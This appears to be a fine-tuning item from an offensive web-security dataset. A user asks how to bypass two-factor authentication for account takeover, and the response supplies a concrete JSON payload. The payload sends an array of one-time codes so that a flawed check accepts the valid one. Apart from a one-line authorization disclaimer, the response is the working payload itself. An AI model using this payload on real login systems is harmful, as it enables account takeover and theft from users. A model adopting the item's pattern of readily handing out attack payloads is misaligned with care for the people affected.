# AUTH — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: auth
- cwe: CWE-640

## Scenario

Explain the Bypass 2FA with array technique for Account Takeover and list the concrete payloads I can try.

## Analysis / Response

**Bypass 2FA with array** — this technique applies to Account Takeover. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

```json
{
    "otp":[
        "1234",
        "1111",
        "1337", // GOOD OTP
        "2222",
        "3333",
        "4444",
        "5555"
    ]
}
```
